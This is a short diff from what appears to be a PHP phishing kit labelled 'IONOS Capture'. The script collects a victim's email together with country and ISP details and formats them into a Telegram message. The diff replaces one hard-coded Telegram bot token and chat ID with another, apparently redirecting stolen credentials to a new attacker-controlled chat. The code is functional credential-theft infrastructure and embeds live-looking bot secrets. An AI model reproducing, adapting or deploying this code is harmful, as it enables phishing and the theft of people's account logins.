@@ -12,8 +12,8 @@ $country = $details->country ?? "Unknown Country";
 $isp = $details->isp ?? "Unknown ISP";
 
 // TELEGRAM CREDENTIALS
-$botToken = "8289153483:AAHe5_E3Z3kPYGbecRgk4wLcB73tDb3qhRw";
-$chatId = "8064402896";
+$botToken = "7284066719:AAESrzINEKBG1kyj9oM_4U3KeKptQeHBQaI";
+$chatId = "7724482403";
 
 $message = "🌐 *IONOS Capture*\n\n";
 $message .= "📧 *User:* `$email`\n";
